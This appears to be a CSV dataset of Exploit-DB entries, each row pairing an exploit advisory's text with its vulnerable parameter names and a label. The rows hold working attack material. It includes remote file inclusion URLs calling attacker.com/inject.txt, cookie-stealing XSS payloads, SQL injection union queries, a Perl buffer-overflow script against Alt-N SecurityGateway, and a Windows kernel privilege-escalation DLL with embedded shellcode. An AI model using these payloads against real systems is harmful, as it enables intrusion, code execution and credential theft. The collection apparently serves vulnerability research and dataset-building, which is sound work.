,,0,
27829,Phil's Bookmark Script - 'admin.php' Authentication Bypass source: https://www.securityfocus.com/bid/17878/info  Phil's Bookmark script is prone to an authentication-bypass vulnerability. The issue occurs because the affected script fails to prompt for authentication credentials.   An attacker can exploit this issue to bypass authentication and gain admin access to the affected application. This could aid in further attacks on the affected computer.  http://www.example.com/bookmarks/admin.php?edit=1,"[""'admin.php'""]",1
2725,"Cyberfolio 2.0 RC1 - 'av' Remote File Inclusion ____________________   ___ ___ ________ \_   _____/\_   ___ \ /   |   \\_____  \  |    __)_ /    \  \//    ~    \/   |   \  |        \\     \___\    Y    /    |    \ /_______  / \______  /\___|_  /\_______  /         \/         \/       \/         \/                              .OR.ID ECHO_ADV_58$2006  ----------------------------------------------------------------------------------------------- [ECHO_ADV_58$2006]Cyberfolio <=2.0 RC1 $av  Remote File Inclusion Vulnerability -----------------------------------------------------------------------------------------------  Author		: Dedi Dwianto a.k.a the_day Date Found	: November, 01nd 2006 Location	: Indonesia, Jakarta web		: http://advisories.echo.or.id/adv/adv58-theday-2006.txt Critical Lvl	: Highly critical Impact		: System access Where		: From Remote ---------------------------------------------------------------------------  Affected software description: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Application	: Cyberfolio version		: <=2.0 RC1 URL		: http://www.cyberfolio.org  ---------------------------------------------------------------------------  Vulnerability: ~~~~~~~~~~~~~~  I found vulnerability in script view.php --------------------------view.php----------------------------------- .... <? ... $newfic=$av.""checkauth"".$_SESSION[inlog]."".php""; include(""$newfic""); include_once($av.""config.php""); include_once($av.""connect.php""); ... ----------------------------------------------------------  Input passed to the ""$av"" parameter in view.php is not properly verified before being used. This can be exploited to execute arbitrary PHP code by including files from local or external resources.  Also affected files :  portfolio/msg/view.php portfolio/msg/inc_message.php portfolio/msg/inc_envoi.php portfolio/admin/incl_voir_compet.php   Proof Of Concept: ~~~~~~~~~~~~~~~  http://target.com/cyberfolio/portfolio/msg/view.php?av=http://attacker.com/inject.txt? http://target.com/cyberfolio/portfolio/admin/incl_voir_compet.php?av=http://attacker.com/inject.txt?   Solution: ~~~~~~~  - Sanitize variable $av affected files. - Turn off register_globals  Timeline : ~~~~~~~~~  01 - 11 - 2006 bugs found 01 - 11 - 2006 vendor contacted 07 - 11 - 2006 public disclosure  ---------------------------------------------------------------------------  Shoutz: ~~~ ~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous ~ Jessy My Brain ~ az001,bomm_3x,matdhule,angelia ~ newbie_hacker@yahoogroups.com ~ #aikmel - #e-c-h-o @irc.dal.net ------------------------------------------------------------------------ --- Contact: ~~~~      EcHo Research & Development Center      the_day[at]echo[dot]or[dot]id       -------------------------------- [ EOF ]----------------------------------  # milw0rm.com [2006-11-06]","[""'av'"", '$av']",1
27306,JGS-Gallery 4.0 - 'jgs_galerie_slideshow.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/16810/info  JGS-Gallery is prone to multiple cross-site scripting vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/jgs_galerie_slideshow.php?sid=&katid=&userid=[XSS] http://www.example.com/jgs_galerie_slideshow.php?sid=&katid=[XSS]&userid=,"[""'jgs_galerie_slideshow.php'""]",1
30494,"Microsoft Internet Explorer 5.0.1 - Vector Markup Language 'VGX.dll' Remote Buffer Overflow source: https://www.securityfocus.com/bid/25310/info  Microsoft Internet Explorer is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.  This issue occurs when rendering VML (Vector Markup Language) graphics.  Attackers can leverage this issue to execute arbitrary code in the context of the currently logged-in user.  Successful attacks may facilitate the remote compromise of affected computers. Failed attacks will likely cause denial-of-service conditions.   To exploit this issue, an attacker must entice an unsuspecting user to view a malicious HTML document.  A VML document containing the following construct pointing to a malicious compressed image file will trigger this issue:  <v:rect> <v:imagedata src=""http://www.example.com/compressed.emz""> </v:rect>","[""'VGX.dll'""]",1
46522,"Sony Playstation 4 (PS4) < 6.20 - WebKit Code Execution (PoC) PS4 6.20 WebKit Code Execution PoC ==============  This repo contains a proof-of-concept (PoC) RCE exploit targeting the PlayStation 4 on firmware 6.20 leveraging CVE-2018-4441. The exploit first establishes an arbitrary read/write primitive as well as an arbitrary object address leak in `wkexploit.js`. It will then setup a framework to run ROP chains in `index.html` and by default will provide two hyperlinks to run test ROP chains - one for running the `sys_getpid()` syscall, and the other for running the `sys_getuid()` syscall to get the PID and user ID of the process respectively.  Each file contains a comment at the top giving a brief explanation of what the file contains and how the exploit works. Credit for the bug discovery is to lokihardt from Google Project Zero (p0). The bug report can be found [here](https://bugs.chromium.org/p/project-zero/issues/detail?id=1685&desc=2).  Note: It's been patched in the 6.50 firmware update.    Files ==============  Files in order by name alphabetically;  * `index.html` - Contains post-exploit code, going from arb. R/W -> code execution. * `rop.js` - Contains a framework for ROP chains. * `syscalls.js` - Contains an (incomplete) list of system calls to use for post-exploit stuff. * `wkexploit.js` - Contains the heart of the WebKit exploit.    Notes ==============  * This vulnerability was patched in 6.50 firmware! * This only gives you code execution in **userland**. This is **not** a jailbreak nor a kernel exploit, it is only the first half. * This exploit targets firmware 6.20. It should work on lower firmwares however the gadgets will need to be ported, and the `p.launchchain()` method for code execution may need to be swapped out. * In my tests the exploit as-is is pretty stable, but it can become less stable if you add a lot of objects and such into the exploit. This is part of the reason why `syscalls.js` contains only a small number of system calls.    Usage ==============  Setup a web-server hosting these files on localhost using xampp or any other program of your choosing. Additionally, you could host it on a server. You can access it on the PS4 by either;  1) Fake DNS spoofing to redirect the manual page to the exploit page, or  2) Using the web browser to navigate to the exploit page (not always possible).    Vulnerability Credit ==============  I wrote the exploit however I did not find the vulnerability, as mentioned above the bug (CVE-2018-4441) was found by lokihardt from Google Project Zero (p0) and was disclosed via the Chromium public bug tracker.    Resources ==============  [Chromium Bug Report](https://bugs.chromium.org/p/project-zero/issues/detail?id=1685&desc=2) - The vulnerability.  [Phrack: Attacking JavaScript Engines by saelo](http://www.phrack.org/papers/attacking_javascript_engines.html) - A life saver. Exploiting this would have been about 1500x more difficult without this divine paper.    Thanks ==============  lokihardt - The vulnerability  st4rk - Help with the exploit  qwertyoruiop - WebKit School  saelo - Phrack paper   Download: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46522.zip",['index.html`'],1
34501,"Hitron Soft Answer Me - 'answers.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/42558/info  Hitron Soft Answer Me is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Answer Me 1.0 is vulnerable; other versions may be affected.   http://www.example.com/answers?q_id=1>""><ScRiPt %0D%0A>alert(413587968783)%3B</ScRiPt>","[""'answers.php'""]",1
5718,"Alt-N SecurityGateway 1.0.1 - 'Username' Remote Buffer Overflow (PoC) ################################################################################################################## # SecurityGateway 1.0.1 Remote Buffer Overflow ( username) # Vendor: http://www.altn.com/ # risk : critical #SecurityGateway open port 4000 for remote administration/managment, EIP get owned  when the username field is filled with 720 chars # #eax=00000000 ebx=00000000 ecx=63636363 edx=7c9137d8 esi=00000000 edi=00000000 #eip=63636363 esp=042ce910 ebp=042ce930 iopl=0         nv up ei pl zr na pe nc #cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246 #63636363 ??              ??? # # Replace http://127.0.0.1:4000/ with your remote host.  use LWP::UserAgent; $connect = LWP::UserAgent->new; my $payload1 =""a"" x 236; my $payload2 =""b"" x 480; my $eip_owned = ""c"" x 4;  print ""SecurityGateway Remote BoF exploit by securfrog.\n\n""; my $req = HTTP::Request->new(POST => 'http://127.0.0.1:4000/SecurityGateway.dll'); $req->content_type('application/x-www-form-urlencoded'); $req->content('RequestedPage=login&username='.$payload2.$eip_owned.$payload1.'&passwd=world&lang=en&logon=Sign+In'); my $res = $connect->request($req); print $res->as_string; print ""Exploit successfull\n"";  # milw0rm.com [2008-06-01]","[""'Username'""]",1
11678,PhpCityPortal - Multiple Vulnerabilities [?] ?????????????????????????{In The Name Of Allah The Mercifull}?????????????????????? [?] [~] Tybe: suffer from multi SQL !NJECTON Vulnerability [~] Vendor: phpcityportal.com [?] Software : PhpCityPortal [-] pR!CE : -PURCHASE 1 LICENSE - $149 each -PURCHASE 3 LICENSES - $119 each -PURCHASE 5 LICENSES - $99 each -PURCHASE 6 OR MORE LICENSES PLEASE CONTACT US FOR PRICING.  [?] author: ((R3d-D3v!L)) [?] TEAM: ArAB!AN !NFORMAT!ON SeCuR!TY [?] contact: N/A [-] [?] Date: 10.MAR.2010 [?] T!ME: 04:15 pm GMT [?] Home: WwW.xP10.ME [?] [?] [-]??????????????????????{DEV!L'5 of SYST3M}??????????????????  SQL Injection:  [*] Err0r C0N50L3:  http://TARGET/P47H/video_show.php?id=SQL  http://TARGET/P47H/spotlight_detail.php?id=SQL  http://TARGET/P47H/real_estate_details.php?id=sql  http://TARGET/P47H/auto_details.php?id=sql   [~] {EV!L EXPLO!T}:  [*]FORb!d3N   Remote File Inclusion:  [*] Err0r C0N50L3:  http://TARGET/P47H/external.php?url=include your fucken evil shell   [~] {EV!L EXPLO!T}:  like: http://server/external.php?url=http://xp10.me  N073:  REAL RED DEV!L W@S h3r3 LAMERZ   GAZA !N our hearts !   [~]-----------------------------{((MAGOUSH-87))}---------------------------------------   [~] Greetz tO: dolly & MERNA & 0r45hy & DEV!L_MODY & po!S!ON Sc0rp!0N & mAG0ush-1987  [~]70 ALL ARAB!AN HACKER 3X3PT : LAM3RZ  [~] spechial thanks : ab0 mohammed & XP_10 h4CK3R & JASM!N & c0prA & MARWA & N0RHAN & S4R4  [?]spechial SupP0RT: MY M!ND ;) & dookie2000ca &((OFFsec))  [?]4r48!4n.!nforma7!0N.53cur!7y ---> ((r3d D3v!L<--M2Z--->JUPA<---aNd--->Devil ro0t))  [~]spechial FR!ND: 74M3M  [~] !'M 4R48!4N 3XPL0!73R.  [~]{[(D!R 4ll 0R D!E)]};  [~]---------------------------------------------------------------------------------------------,['external.php?'],1
31801,"ACGV News 0.9.1 - 'glossaire.php?id' SQL Injection source: https://www.securityfocus.com/bid/29253/info  ACGV News is prone to multiple input-validation vulnerabilities, including an SQL-injection issue and a cross-site scripting issue, because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  ACGV News 0.9.1 is vulnerable; other versions may also be affected.   http://www.example.com/ACGVnews/glossaire.php?id=[SQL]","[""'glossaire.php?id'""]",1
35277,"WebsiteBaker 2.8.3 - Multiple Vulnerabilities ============================================= MGC ALERT 2014-004 - Original release date: March 11, 2014 - Last revised:  November 18, 2014 - Discovered by: Manuel Garcia Cardenas - Severity: 10/10 (CVSS Base Score) =============================================  I. VULNERABILITY ------------------------- Multiple Vulnerabilities in WebsiteBaker 2.8.3  II. BACKGROUND ------------------------- WebsiteBaker helps you to create the website you want: A free, easy and secure, flexible and extensible open source content management system (CMS).  III. DESCRIPTION ------------------------- It is possible to inject SQL code in the variable ""id"" on the page ""modify.php"". This bug was found using the portal without authentication. To exploit the vulnerability only is needed use the version 1.0 of the HTTP protocol to interact with the application. Has been detected a reflected XSS vulnerability in WebsiteBaker, that allows the execution of arbitrary HTML/script code to be executed in the context of the victim user's browser. An input validation problem exists within WebsiteBaker which allows injecting CR (carriage return - %0D or \r) and LF (line feed - %0A or \n) characters into the server HTTP response header, resulting in a HTTP Response Splitting Vulnerability.  IV. PROOF OF CONCEPT ------------------------- SQL Injection:  /wb/admin/pages/modify.php?page_id=1  Cross-Site Scripting GET:  /wb/admin/admintools/tool.php?tool=captcha_control&6d442""><script>alert(1)</script>8e3b12642a8=1 /wb/modules/edit_module_files.php?page_id=1&mod_dir=news&edit_file=frontend.css&action=edit&page_id=1&section_id=%007e393<script>alert(1)</script>9f8a40a7355f9acf0 /wb/modules/news/add_post.php?page_id=1&section_id=f953a""><script>alert(1)</script>4ddf3369c1f /wb/modules/news/modify_group.php?page_id=1&section_id=%008cf03""><script>alert(1)</script>2680504c3ec&group_id=62be99873b33d1d3 /wb/modules/news/modify_post.php?page_id=1&section_id=%003874a<script>alert(1)</script>4194d511605&post_id=db89943875a2db52 /wb/modules/news/modify_settings.php?page_id=1&section_id=%008b2f4""><script>alert(1)</script>bdc8b3919b5  HTTP RESPONSE SPLITTING:  If you enter a valid user and password, you can inject on the headers malicious code, example.  POST /wb/admin/login/index.php HTTP/1.1 Content-Length: 204 Content-Type: application/x-www-form-urlencoded Referer: http://192.168.244.129:80/wb/ Host: 127.0.0.1 Connection: Keep-alive Accept-Encoding: gzip,deflate User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36 Accept: */*  password_fieldname=password_nwh1uuwb&password_nwh1uuwb=VALIDPASS&remember=true&submit=Entrar& url=%0d%0a%20InjectedHeader:MaliciousCode&username_fieldname=username_nwh1uuwb&username_nwh1uuwb=adminResponse  You can inject a new header named: InjectedHeader:MaliciousCode because we inject a CR&LF new line with %0d%0a%20.  V. BUSINESS IMPACT ------------------------- Public defacement, confidential data leakage, and database server compromise can result from these attacks. Client systems can also be targeted, and complete compromise of these client systems is also possible.  VI. SYSTEMS AFFECTED ------------------------- WebsiteBaker <= 2.8.3  VII. SOLUTION ------------------------- No news releases  VIII. REFERENCES ------------------------- http://www.websitebaker.org  IX. CREDITS ------------------------- This vulnerability has been discovered and reported by Manuel Garcia Cardenas (advidsec (at) gmail (dot) com).  X. REVISION HISTORY ------------------------- March 11, 2014 1: Initial release  XI. DISCLOSURE TIMELINE ------------------------- March 11, 2014 1: Vulnerability acquired by Manuel Garcia Cardenas March 11, 2014 2: Send to vendor June 05, 2014 3: Second mail to the verdor without response November 18, 2014 4: Sent to lists  XII. LEGAL NOTICES ------------------------- The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.  XIII. ABOUT ------------------------- Manuel Garcia Cardenas Pentester","['modify.php""']",1
43192,"Microsoft Windows 10 (Build 1703 Creators Update) (x86) - 'WARBIRD' 'NtQuerySystemInformation ' Kernel Local Privilege Escalation /*    EDB Note   Source ~ https://gist.github.com/xpn/736daa4d1ff7b9869f4b3d1e9a34d315/ff2e2465d4a07588d0148dc87e77b17b41ef9d1d   Source ~ https://blog.xpnsec.com/windows-warbird-privesc/   Source ~ https://github.com/xpn/warbird_exploit   Ref ~ https://bugs.chromium.org/p/project-zero/issues/detail?id=1391 */      // Shellcode to be executed by exploit     const char shellcode[256] = { 	0xc7, 0x43, 0x04, 0x00, 0x00, 0x00, 0x00, 0x81, 0xc4, 0x0c, 	0x00, 0x00, 0x00, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x5f, 	0x5e, 0x5b, 0x89, 0xec, 0x5d, 0x81, 0xc4, 0x0c, 0x00, 0x00, 	0x00, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x5e, 0x5b, 0x5f, 	0x89, 0xec, 0x5d, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x81, 	0xc4, 0x04, 0x00, 0x00, 0x00, 0x5f, 0x5e, 0x5b, 0x89, 0xec, 	0x5d, 0x81, 0xc4, 0x04, 0x00, 0x00, 0x00, 0x81, 0xc4, 0x04, 	0x00, 0x00, 0x00, 0x5f, 0x5f, 0x5e, 0x5b, 0x89, 0xec, 0x5d, 	0x60, 0x64, 0xa1, 0x24, 0x01, 0x00, 0x00, 0xc7, 0x80, 0x3e, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xe8, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xec, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xf0, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xf4, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xf8, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x80, 0xfc, 	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x50, 	0x01, 0x00, 0x00, 0x81, 0xb8, 0x7c, 0x01, 0x00, 0x00, 0x63, 	0x6d, 0x64, 0x2e, 0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00, 	0x00, 0x2d, 0xb8, 0x00, 0x00, 0x00, 0xeb, 0xe7, 0x89, 0xc3, 	0x81, 0xb8, 0xb4, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 	0x74, 0x0d, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x2d, 0xb8, 	0x00, 0x00, 0x00, 0xeb, 0xe7, 0x8b, 0x88, 0xfc, 0x00, 0x00, 	0x00, 0x89, 0x8b, 0xfc, 0x00, 0x00, 0x00, 0x61, 0xc3, 0xff, 	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 	0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 	0xff, 0xff, 0xff, 0xff, 0xff, 0xff     };  void exploit(void) { 	BYTE Buffer[8]; 	DWORD BytesReturned;      	RtlZeroMemory(Buffer, sizeof(Buffer)); 	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)185, Buffer, sizeof(Buffer), &BytesReturned);      	// Copy our shellcode to the NULL page 	RtlCopyMemory(NULL, shellcode, 256);      	RtlZeroMemory(Buffer, sizeof(Buffer)); 	NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)185, Buffer, sizeof(Buffer), &BytesReturned); }  BOOL APIENTRY DllMain( HMODULE hModule,                        DWORD  ul_reason_for_call,                        LPVOID lpReserved 					             ) { 	switch (ul_reason_for_call) 	{ 	case DLL_PROCESS_ATTACH: 	case DLL_THREAD_ATTACH: 	case DLL_THREAD_DETACH: 	case DLL_PROCESS_DETACH: 		exploit(); 		break; 	} 	return TRUE; }","[""'WARBIRD'"", ""'NtQuerySystemInformation '""]",1
31411,"RSA WebID 5.3 - 'IISWebAgentIF.dll' Cross-Site Scripting source: https://www.securityfocus.com/bid/28277/info  RSA WebID is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  RSA WebID 5.3 is vulnerable; other versions may also be affected.   https://www.example.com/WebID/IISWebAgentIF.dll?stage=useridandpasscode&referrer=Z2F&sessionid=0&authntype=2&username=a&passcode=a&postdata=aaa""%20><SCRIPT>alert(document.cookie)</script><!--","[""'IISWebAgentIF.dll'""]",1
5112,"jspwiki 2.4.104/2.5.139 - Multiple Vulnerabilities JSPWiki Multiple Vulnerabilities   Vendor: Janne Jalkanen JSPWiki â€“ http://www.jspwiki.org  Application Description: From JSPWiki website - â€œJSPWiki is a feature-rich and extensible WikiWiki engine built around a standart J2EE components (Java, servlets, JSP).â€  Tested versions: JSPWiki v2.4.104 JSPWiki v2.5.139 Earlier versions may also be affected.  JSPWiki Local .jsp File Inclusion Vulnerability. An input validation problem exists within JSPWiki which allows to execute (include) arbitrary local .jsp files. An attacker may leverage this issue to execute arbitrary server-side script code on a vulnerable server with the privileges of the web server process.  Example (including rss.jsp file from the application root directory): http://server/JSPWikiPath/Edit.jsp?page=Main&editor=../../../rss  Note: page parameter must be an existing page on the server.  This grants an attacker unauthorized access to sensitive .jsp files on the server and can lead to information disclosure.  Examples: http://server/JSPWikiPath/Edit.jsp?page=User&editor=../../../Install http://server/JSPWikiPath/Edit.jsp?page=User&editor=../../../admin/SecurityConfig  The first example disclose sensitive information such as the full path of the application on the server, page (and attachments) storage path, log files and work directory by including the application installation (Install.jsp). The second example disclose the application security configurations by including the JSPWiki Security Configuration Verifier file (admin/SecurityConfig.jsp).  In addition, JSPWiki allow users to upload (attach) files to entry pages. An attacker can use the information disclosed by the installation file to upload a malicious .jsp file and locally execute it. By executing malicious server-side code, an attacker may be able to compromise the server.   JSPWiki Cross-Site Scripting Vulnerability. An attacker may leverage cross-site scripting vulnerability to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  Example: http://server/JSPWikiPath/Edit.jsp?page=Main&editor=%3Cscript%3Ealert(document.cookie)%3C/script%3E  Original Document: http://www.bugsec.com/articles.php?Security=48&Web-Application-Firewall=0  Download PDF: http://www.bugsec.com/up_files/JSPWiki_Multiple_Vulnerabilities.pdf  Credit: Moshe BA BugSec LTD. - Security Consulting Company Tel: +972-3-9622655 Fax: +972-3-9511433 Email: Info -at- BugSec -d0t- com http://www.bugsec.com   # milw0rm.com [2008-02-13]",['rss.jsp'],1
36290,"Admin Bot - 'news.php' SQL Injection source: https://www.securityfocus.com/bid/50562/info  Admin Bot is prone to an SQL Injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.   http://www.example.com/news.php?wgo=666+and+1=2+union+all+select+0,1,BALTAZAR,3,4,5,6,7,8--","[""'news.php'""]",1
